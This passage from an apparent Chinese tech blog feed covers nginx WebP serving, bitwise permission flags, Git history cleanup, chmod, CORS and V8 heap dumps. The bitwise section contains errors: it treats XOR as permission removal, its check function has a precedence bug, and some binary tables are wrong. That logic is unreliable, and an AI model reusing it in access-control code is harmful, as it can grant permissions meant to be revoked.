第二位用来判断对应的webp文件是否存在</span></span><br><span class="line">    <span class="attribute">if</span> (-f <span class="string">&quot;<span class="variable">$&#123;document_root&#125;</span>/webp/<span class="variable">$&#123;filename&#125;</span>.webp&quot;</span>) &#123;</span><br><span class="line">        <span class="attribute">set</span> <span class="variable">$swebp</span>   <span class="string">&quot;<span class="variable">$&#123;swebp&#125;</span>1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="attribute">if</span> (<span class="variable">$swebp</span> = <span class="string">&quot;11&quot;</span>) &#123;</span><br><span class="line">        <span class="comment"># add_header Vary   &quot;Accept,Content-Type&quot;;</span></span><br><span class="line">        <span class="comment"># add_header Vary   &quot;Content-Type&quot;;</span></span><br><span class="line">        <span class="attribute">add_header</span>   Vary   Accept;</span><br><span class="line">        <span class="attribute">rewrite</span><span class="regexp"> ^</span> /webp/<span class="variable">$&#123;filename&#125;</span>.webp <span class="literal">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>访问 <a href="http://example.kekek.cc/webp/2018-FIFA-World-Cup.png">http://example.kekek.cc/webp/2018-FIFA-World-Cup.png</a> 查看</p><p>下面两幅图分别为在Chrome和Firefox浏览器中访问的响应：<br><strong>Chrome</strong><br><img src="/images/webp-chrome.png" alt="Chrome WebP"></p><p><strong>Firefox</strong><br><img src="/images/webp-firefox.png" alt="Firefox WebP"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://developers.google.com/speed/webp/faq">What is WebP? Why should I use it?</a> </li><li><a href="http://zmx.im/blog?bname=webp">美团在webp方面的实践</a> </li><li><a href="http://www.btorange.com/2013/06/14/webp.html">WEBP是什么呢？</a> </li><li><a href="http://blog.csdn.net/u013063153/article/details/52677737">扒一扒“WEBP格式”的图片</a> </li><li><a href="https://optimus.keycdn.com/support/webp-support/">WebP Support – It’s More Than You Think</a></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>位运算和权限管理系统</title>
      <link href="/post/bitwise-permission.html"/>
      <url>/post/bitwise-permission.html</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>在 Linux 文件系统中用户对文件有 <code>读</code>、<code>写</code>、<code>执行</code>三种权限，可以分别使用数字：<code>4</code>、<code>2</code>、<code>1</code> 三个数字来表示。三个数字任意组合可以表示不同的权限，例如： 7 （4 + 2 + 1）表示用户对对此文件拥有所有权限，6 （4 + 2）表示用户对此文件有<code>读</code>、<code>写</code>权限。</p><h3 id="为什么是1、2、4-？"><a href="#为什么是1、2、4-？" class="headerlink" title="为什么是1、2、4 ？"></a>为什么是1、2、4 ？</h3><p>对于 <code>读</code>、<code>写</code>、<code>执行</code> 我们用<code>0</code>表示由此权限，<code>1</code>表示无此权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">读 写 执行        二进制     十进制</span><br><span class="line">0  0  0    ==&gt;   000   ==&gt;   0</span><br><span class="line">0  0  1    ==&gt;   001   ==&gt;   1   // 执行</span><br><span class="line">0  1  0    ==&gt;   010   ==&gt;   2   // 写</span><br><span class="line">1  0  0    ==&gt;   100   ==&gt;   4   // 读</span><br><span class="line"></span><br><span class="line">0  1  1    ==&gt;   011   ==&gt;   3   // 执行 + 写</span><br><span class="line">1  0  1    ==&gt;   101   ==&gt;   5   // 读 + 执行</span><br><span class="line">1  1  0    ==&gt;   110   ==&gt;   6   // 读 + 写</span><br><span class="line">1  1  1    ==&gt;   111   ==&gt;   7   // 读 + 写 + 执行</span><br></pre></td></tr></table></figure><p>为什么是<code>1</code>、<code>2</code>、<code>4</code>?<br><code>1</code>、<code>2</code>、<code>4</code> 的二进制表现形式是<code>001</code>、<code>010</code>、<code>100</code>，它们的二进制表现形式只有一位是<code>1</code>。这样，在权限叠加时，不会出现进位的情况。我们就可以判断最终结果的二进制位的<code>0</code>、<code>1</code>情况来判断是否有此权限。<br>例如<code>读 + 写</code> 权限 <code>101</code>。第一位<code>读</code>权限为<code>1</code>，有<code>读</code>权限。第二位<code>写</code>权限为<code>0</code>，无写权限。第三位<code>执行</code>权限为<code>1</code>表示有执行权限。</p><h3 id="位运算实现权限操作"><a href="#位运算实现权限操作" class="headerlink" title="位运算实现权限操作"></a>位运算实现权限操作</h3><h4 id="或运算实现权限的添加"><a href="#或运算实现权限的添加" class="headerlink" title="或运算实现权限的添加"></a>或运算实现权限的添加</h4><p>增加权限使用<code>或</code>（<code>|</code>）运算实现。</p><p>如，为用户增加“读取”、“写入”两种权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读   写   执行      二进制     十进制</span><br><span class="line">0    1    0   ==&gt;   010  ==&gt;  2</span><br><span class="line">1    0    0   ==&gt;   100  ==&gt;  4</span><br><span class="line">1    1    0   ==&gt;   110  ==&gt;  6  // 或（|）运算结果</span><br></pre></td></tr></table></figure><p>“读写”两种权限，权限码为<code>6</code>（<code>110</code>），其由权限码<code>2</code>（<code>010</code>）和<code>4</code>（<code>100</code>）进行<code>或</code>（<code>|</code>）运算后实现，即：<code>6 = 2 | 4</code>，也可以由<code>6 = 2 + 4</code>计算得出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">addPermission (权限集值, 权限项) &#123;</span><br><span class="line">    return 权限集值 | 权限项</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="与运算实现权限的判断"><a href="#与运算实现权限的判断" class="headerlink" title="与运算实现权限的判断"></a>与运算实现权限的判断</h4><p>在需要进行用户权限判断时，可以使用<code>与</code>（<code>&amp;</code>）运算判断用户是否据有某项权限。</p><p>如，判断权限码为<code>6</code>用户是否有读取权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读   写   执行      二进制     十进制</span><br><span class="line">1    1    0   ==&gt;   110  ==&gt;  6</span><br><span class="line">1    0    0   ==&gt;   100  ==&gt;  4</span><br><span class="line">1    0    0   ==&gt;   100  ==&gt;  4  // 与（&amp;）运算结果</span><br></pre></td></tr></table></figure><p>权限码<code>6</code>（<code>110</code>）和<code>4</code>（<code>100</code>）的与运算结果为 <code>4</code>，即：<code>4 = 6 &amp; 4</code>。</p><p>判断权限码为6用户是否有执行权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读   写   执行      二进制      十进制</span><br><span class="line">1    1    0   ==&gt;   110   ==&gt;  6</span><br><span class="line">0    0    1   ==&gt;   001   ==&gt;  1</span><br><span class="line">0    0    0   ==&gt;   000   ==&gt;  0  // 与（&amp;）运算结果</span><br></pre></td></tr></table></figure><p>权限码<code>6</code>（<code>110</code>）和<code>1</code>（<code>001</code>）的与运算结果为<code>0</code>，即：<code>0 = 6 &amp; 1</code>。</p><p>根据与运算的计算规律，当运算结果为所要判断权限本身值时，我们可以认为用户具有这个权限。而当运算结果为 <code>0</code> 时，我们可以认为用户不具有这个权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">checkPermission (权限集值, 权限项) &#123;</span><br><span class="line">    return 权限集值 &amp; 权限项 == 权限项</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="非运算实现权限的减少"><a href="#非运算实现权限的减少" class="headerlink" title="非运算实现权限的减少"></a>非运算实现权限的减少</h4><p>位运算同样可以实现用户权限的减少，减少用户权限使用<code>非</code>（<code>^</code>）运算。</p><p>如，将权限码为<code>7</code>用户，移除执行权限：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">读   写   执行      二进制      十进制</span><br><span class="line">1    1    1   ==&gt;   110   ==&gt;  7</span><br><span class="line">0    0    1   ==&gt;   001   ==&gt;  1</span><br><span class="line">1    1    0   ==&gt;   000   ==&gt;  6  // 非（^）运算结果</span><br></pre></td></tr></table></figure><p>权限码<code>7</code>（<code>111</code>）和<code>1</code>（<code>001</code>）的非运算结果为<code>6</code>，即：<code>6 = 7 ^ 1</code>，也可以由<code>6 = 7 - 1</code>计算得出。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">deletePermission (权限集值, 权限项) &#123;</span><br><span class="line">    return 权限集值 ^ 权限项</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="延伸"><a href="#延伸" class="headerlink" title="延伸"></a>延伸</h3><p>如果权限集超过三种呢？<br>例子：用位权限表示<code>增</code>、<code>删</code>、<code>改</code>、<code>查</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">增 删 改  查        二进制     十进制</span><br><span class="line">0  0  0  0   ==&gt;   0000   ==&gt;   0</span><br><span class="line">0  0  0  1   ==&gt;   0001   ==&gt;   1   // 查</span><br><span class="line">0  0  1  0   ==&gt;   0010   ==&gt;   2   // 改</span><br><span class="line">0  1  0  0   ==&gt;   0100   ==&gt;   4   // 删</span><br><span class="line">1  0  0  0   ==&gt;   1000   ==&gt;   8   // 增</span><br><span class="line"></span><br><span class="line">0  0  1  1  ==&gt;   0011   ==&gt;   3   // 改 + 查</span><br><span class="line">0  1  1  1  ==&gt;   0111   ==&gt;   7   // 删 + 改 + 查</span><br><span class="line">1  1  1  1  ==&gt;   1111   ==&gt;   15  // 增 + 删 + 改 + 查</span><br><span class="line">1  0  1  1  ==&gt;   1011   ==&gt;   11  // 增 + 改 + 查</span><br></pre></td></tr></table></figure><p>如果类型有<code>N</code>种，我们就用<code>N</code>位二进制来表示。</p><blockquote><p>位运算也有一些局限性，随着权限码增加，数据长度也相应的增长。这就要求权限码不能超过计算本身运算长度，在数据库中存储权限码时，权限码长度也不能的超过所使用数据类型。如：在32位系统中不能超过232，也就是权限数量不能多于32个。而mySQL数据库的BIGINT，其存储空间为8Byte，使用BIGINT存储存储码时，权限数不能多于64个(8*8-1)。</p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://itbilu.com/other/relate/4yJxR6awl.html">【1】</a> <a href="http://blog.csdn.net/ajian005/article/details/8490899">【2】</a> <a href="https://xiaobin.net/200906/bitwise-permission/">【3】</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> bitwise </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>压缩稀疏镜像</title>
      <link href="/post/compact-sparse-bundle-image.html"/>
      <url>/post/compact-sparse-bundle-image.html</url>
      
        <content type="html"><![CDATA[<h3 id="释放稀疏磁盘映像空洞"><a href="#释放稀疏磁盘映像空洞" class="headerlink" title="释放稀疏磁盘映像空洞"></a>释放稀疏磁盘映像空洞</h3><p>如果直接去删除镜像的文件后镜像大小不会改变，这时候需要去手动释放一下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hdiutil compact /path/to/disk-image</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Git 清理大文件</title>
      <link href="/post/git-delete-large-file.html"/>
      <url>/post/git-delete-large-file.html</url>
      
        <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>有些时候，有人误提交了一些大文件或者敏感文件。我们需要清理掉这些文件的提交记录。<br>下面我们就以清理清理大文件来介绍一下。</p><h3 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h3><h4 id="Step-1-查看哪些历史提交过文件占用空间较大"><a href="#Step-1-查看哪些历史提交过文件占用空间较大" class="headerlink" title="Step 1 查看哪些历史提交过文件占用空间较大"></a>Step 1 查看哪些历史提交过文件占用空间较大</h4><p>使用以下命令可以查看占用空间最多的五个文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rev-list --objects --all | grep &quot;$(git verify-pack -v .git/objects/pack/*.idx | sort -k 3 -n | tail -5 | awk &#x27;&#123;print$1&#125;&#x27;)&quot;</span><br></pre></td></tr></table></figure><p>rev-list 命令用来列出 Git 仓库中的提交，我们用它来列出所有提交中涉及的文件名及其ID。 该命令可以指定只显示某个引用（或分支）的上下游的提交。</p><blockquote><p>–objects：列出该提交涉及的所有文件ID。</p></blockquote><blockquote><p>–all：所有分支的提交，相当于指定了位于&#x2F;refs下的所有引用。</p></blockquote><blockquote><p>verify-pack命令用于显示已打包的内容。</p></blockquote><h4 id="Step-2-重写commit，删除大文件"><a href="#Step-2-重写commit，删除大文件" class="headerlink" title="Step 2 重写commit，删除大文件"></a>Step 2 重写commit，删除大文件</h4><p>使用以下命令，删除历史提交过的大文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git filter-branch --force --index-filter &#x27;git rm -rf --cached --ignore-unmatch big-file.jar&#x27; --prune-empty --tag-name-filter cat -- --all</span><br></pre></td></tr></table></figure><p>上面脚本中的 big-file.jar 请换成你第一步查出的大文件名，或者这里直接写一个目录。</p><p>filter-branch 命令可以用来重写Git仓库中的提交</p><blockquote><p>–index-filter参数用来指定一条Bash命令，然后Git会检出（checkout）所有的提交， 执行该命令，然后重新提交。</p></blockquote><blockquote><p>–all参数表示我们需要重写所有分支（或引用）。</p></blockquote><p>在重写提交的过程中，会有以下日志输出:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rewrite 6cdbb293d453ced07e6a07e0aa6e580e6a5538f4 (266/266)</span><br><span class="line"># Ref &#x27;refs/heads/master&#x27; was rewritten</span><br></pre></td></tr></table></figure><p>如果显示 <code>xxxxx unchanged</code> , 说明repo里没有找到该文件, 请检查路径和文件名是否正确，重复上面的脚本，把所有你想删除的文件都删掉。</p><h4 id="Step-3-推送修改后的repo"><a href="#Step-3-推送修改后的repo" class="headerlink" title="Step 3 推送修改后的repo"></a>Step 3 推送修改后的repo</h4><p>以强制覆盖的方式推送你的repo, 命令如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin master --force</span><br></pre></td></tr></table></figure><h4 id="Step-4-清理和回收空间"><a href="#Step-4-清理和回收空间" class="headerlink" title="Step 4 清理和回收空间"></a>Step 4 清理和回收空间</h4><p>虽然上面我们已经删除了文件, 但是我们的repo里面仍然保留了这些objects, 等待垃圾回收(GC), 所以我们要用命令彻底清除它, 并收回空间，命令如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rm -rf .git/refs/original/</span><br><span class="line"></span><br><span class="line">git reflog expire --expire=now --all</span><br><span class="line"></span><br><span class="line">git gc --prune=now</span><br></pre></td></tr></table></figure><p>至此，我们已经彻底的删除了我们不想要的文件。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://www.hollischuang.com/archives/1708">记一次删除Git记录中的大文件的过程</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux文件权限</title>
      <link href="/post/linux-file-permissions.html"/>
      <url>/post/linux-file-permissions.html</url>
      
        <content type="html"><![CDATA[<p>chmod是Linux下设置文件权限的命令，后面的数字表示不同用户或用户组的权限。</p><p>一般是三个数字：<br>第一个数字表示文件所有者的权限<br>第二个数字表示与文件所有者同属一个用户组的其他用户的权限<br>第三个数字表示其它用户组的权限。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">权限分为三种：读（r=4）、写（w=2）、执行（x=1）。 综合起来还有可读可执行（rx=5=4+1）、可读可写（rw=6=4+2）、可读可写可执行（rwx=7=4+2+1）。</span><br><span class="line">所以，chmod 755 设置用户的权限为：</span><br></pre></td></tr></table></figure><table><thead><tr><th>位</th><th>说明</th></tr></thead><tbody><tr><td>7</td><td>文件所有者可读可写可执行</td></tr><tr><td>5</td><td>与文件所有者同属一个用户组的其他用户可读可执行</td></tr><tr><td>5</td><td>其它用户组可读可执行</td></tr></tbody></table><p>chattr [+&#x2F;-]i filename </p><h3 id="x-权限"><a href="#x-权限" class="headerlink" title="x 权限"></a>x 权限</h3><ul><li><p>文件</p><p>  有权限执行 <code>./</code></p></li><li><p>目录</p><p>  有权限进入 <code>cd</code></p></li></ul><h3 id="r-权限"><a href="#r-权限" class="headerlink" title="r 权限"></a>r 权限</h3><ul><li><p>文件</p><p>  有权限读 <code>cat</code></p></li><li><p>目录</p><p>  有权限查看 <code>ls</code></p></li></ul><h3 id="w-权限"><a href="#w-权限" class="headerlink" title="w 权限"></a>w 权限</h3><ul><li><p>文件</p><p>  有权限写 <code>echo hello &gt;</code></p></li><li><p>目录</p><p>  有权限写入 <code>touch</code> 有权限删除 <code>rm</code></p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>nginx_try_files</title>
      <link href="/post/nginx_try_files.html"/>
      <url>/post/nginx_try_files.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://openresty.org/download/agentzh-nginx-tutorials-zhcn.html#02-NginxDirectiveExecOrder11">https://openresty.org/download/agentzh-nginx-tutorials-zhcn.html#02-NginxDirectiveExecOrder11</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>跨域资源共享 CORS</title>
      <link href="/post/cors.html"/>
      <url>/post/cors.html</url>
      
        <content type="html"><![CDATA[<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>Cross-Origin Resource Sharing（CORS）是HTTP在协议层对处理跨域问题给出的方案。在所有现代浏览器中都可以使用CORS来处理跨域，对于不支持的浏览器可以降级使用JSONP方案代替。</p><iframe src="https://caniuse.com/cors/embed/description&links" width="100%" height="350px" frameborder="0" loading="lazy" allowfullscreen></iframe><h3 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h3><p><a href="https://enable-cors.org/index.html">https://enable-cors.org/index.html</a></p><h3 id="携带Cookie"><a href="#携带Cookie" class="headerlink" title="携带Cookie"></a>携带Cookie</h3><p>跨域ajax请求时默认是不会携带Cookie的，需要设置<code>withCredentials</code>为true。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/credentialed-content/&#x27;</span>;</span><br><span class="line">    </span><br><span class="line"><span class="keyword">function</span> <span class="title function_">callOtherDomain</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(invocation) &#123;</span><br><span class="line">        invocation.<span class="title function_">open</span>(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">        invocation.<span class="property">withCredentials</span> = <span class="literal">true</span>;</span><br><span class="line">        invocation.<span class="property">onreadystatechange</span> = handler;</span><br><span class="line">        invocation.<span class="title function_">send</span>(); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><ol><li><p>preflight</p><p> 对于 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS#%E7%AE%80%E5%8D%95%E8%AF%B7%E6%B1%82">复杂请求</a> 浏览器会发起预请求，我们可以设置 <code>Access-Control-Max-Age</code> 指定了 <code>preflight</code> 请求的结果能够被缓存多久。这里需要注意的是浏览器不是根据域名来做缓存的，是根绝URL。如果URL或者Query不一样，每次都会发起 <code>preflight</code>。</p></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">HTTP访问控制（CORS）</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> cors </tag>
            
            <tag> ajax </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网站预加载技术</title>
      <link href="/post/prefetching-preloading-prebrowsing.html"/>
      <url>/post/prefetching-preloading-prebrowsing.html</url>
      
        <content type="html"><![CDATA[<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="http://www.alloyteam.com/2015/10/prefetching-preloading-prebrowsing/">【1】</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>v8堆内存分析</title>
      <link href="/post/v8-heapdump.html"/>
      <url>/post/v8-heapdump.html</url>
      
        <content type="html"><![CDATA[<h3 id="Node-js-内存分析"><a href="#Node-js-内存分析" class="headerlink" title="Node.js 内存分析"></a>Node.js 内存分析</h3><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="heapdump"><a href="#heapdump" class="headerlink" title="heapdump"></a>heapdump</h4><p>heapdump 可以使用来将 v8 引擎的堆内存内容dump出来，这样你就可以在 Chrome 的开发者工具中查看问题。</p><p>发送信号 <code>kill -USR2 &lt;pid&gt;</code> 后会生成一个内存的快照。导入开发者工具中就能查看了。</p><h4 id="memwatch"><a href="#memwatch" class="headerlink" title="memwatch"></a>memwatch</h4><p>这个可以在代码里直接使用，实时检测内存动态，当发生内存泄漏的时候，会触发 <code>leak</code> 事件，会传递当前的堆状态，配合 heapdump 有奇效。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> memwatch = <span class="built_in">require</span>(<span class="string">&#x27;memwatch&#x27;</span>);</span><br><span class="line"></span><br><span class="line">memwatch.<span class="title function_">on</span>(<span class="string">&#x27;leak&#x27;</span>, <span class="keyword">function</span>(<span class="params">info</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(info);</span><br><span class="line">    <span class="keyword">let</span> file = <span class="string">&#x27;/tmp/myapp-&#x27;</span> + process.<span class="property">pid</span> + <span class="string">&#x27;-&#x27;</span> + <span class="title class_">Date</span>.<span class="title function_">now</span>() + <span class="string">&#x27;.heapsnapshot&#x27;</span>;</span><br><span class="line">    heapdump.<span class="title function_">writeSnapshot</span>(file, <span class="keyword">function</span>(<span class="params">err</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (err) <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Wrote snapshot: &#x27;</span> + file);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h4 id="devTool"><a href="#devTool" class="headerlink" title="devTool"></a>devTool</h4><p>安装 <code>npm install -g devtool</code></p><p>可以在 devtool 分析 dump 出来的内存信息，也可以使用 devtool 来调试代码。直接 <code>devtool app.js</code> 运行代码。</p><p><img src="/images/QQ20170228-182355@2x.jpg"><br><img src="/images/QQ20170228-182213@2x.jpg"></p><p>堆快照提供了不同的视角来进行查看：</p><ul><li>Summary 该视图按照构造函数进行分组，用它可以捕获对象和它们使用的内存情况，对于跟踪定位DOM节点的内存泄漏特别有用。</li><li>Comparison 对比两个快照的差别，用它可以对比某个操作前后的内存快照。分析操作前后的内存释放情况以及它的引用计数，便于你确认内存是否存在泄漏以及造成的原因。</li><li>Containment 该视图可以探测堆的具体内容，它提供了一个更适合的视图来查看对象结构，有助于分析对象的引用情况，使用它可以分析闭包和进行更深层次的对象分析。</li><li>Statistics 统计视图。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;heapdump&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> execSync = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="property">execSync</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">User</span>(<span class="params">name, age</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">age</span> = age;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">users = [];</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1024</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> user = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">`name <span class="subst">$&#123;i&#125;</span>`</span>, i);</span><br><span class="line">    users.<span class="title function_">push</span>(user);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">students = users;</span><br><span class="line">employees = users;</span><br><span class="line"></span><br><span class="line"><span class="title function_">execSync</span>(<span class="string">`kill -USR2 <span class="subst">$&#123;process.pid&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">setTimeout</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123; process.<span class="title function_">exit</span>(<span class="number">0</span>); &#125;, <span class="number">3000</span>);</span><br></pre></td></tr></table></figure><p><img src="/images/QQ20171031-150928@2x.jpg"></p><p>更详细的介绍可以查看<a href="http://zhuchenglin.me/2016-10-21-chrome-devtools-in-depth-4/#take-heap-snapshot%E7%AE%80%E4%BB%8B">Take Heap Snapshot 简介</a></p><h3 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC</h3><p>在启动时加上 <code>--trace_gc</code> 或者 <code>--trace_gc_nvp</code> 后每次垃圾回收时都会打印出GC日志。这两日志的格式不太相同。</p><blockquote><p>node –v8-options | grep gc </p></blockquote><h4 id="GC简介"><a href="#GC简介" class="headerlink" title="GC简介"></a>GC简介</h4><p><img src="/images/d9928033-09a4-48f3-b5f1-efec986d77c1.png"></p><h4 id="GC日志"><a href="#GC日志" class="headerlink" title="GC日志"></a>GC日志</h4><p><img src="/images/QQ20170228-183949@2x.jpg"><br><img src="/images/QQ20170228-184005@2x.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[11631:0x102001c00]        7 ms: Scavenge 2.1 (6.0) -&gt; 2.1 (7.0) MB, 0.5 / 0.0 ms [allocation failure].</span><br><span class="line">[11631:0x102001c00] Memory allocator,   used:   7204 KB, available: 1459164 KB</span><br><span class="line">[11631:0x102001c00] New space,          used:    957 KB, available:     50 KB, committed:   2048 KB</span><br><span class="line">[11631:0x102001c00] Old space,          used:    888 KB, available:      0 KB, committed:    980 KB</span><br><span class="line">[11631:0x102001c00] Code space,         used:    242 KB, available:      0 KB, committed:   1024 KB</span><br><span class="line">[11631:0x102001c00] Map space,          used:     49 KB, available:      0 KB, committed:     80 KB</span><br><span class="line">[11631:0x102001c00] Large object space, used:      0 KB, available: 1458123 KB, committed:      0 KB</span><br><span class="line">[11631:0x102001c00] All spaces,         used:   2137 KB, available: 1458173 KB, committed:   4132 KB</span><br><span class="line">[11631:0x102001c00] External memory reported:      0 KB</span><br><span class="line">[11631:0x102001c00] Total time spent in GC  : 0.5 ms</span><br></pre></td></tr></table></figure><p>上面日志的</p><p>V8内存结构图<br><img 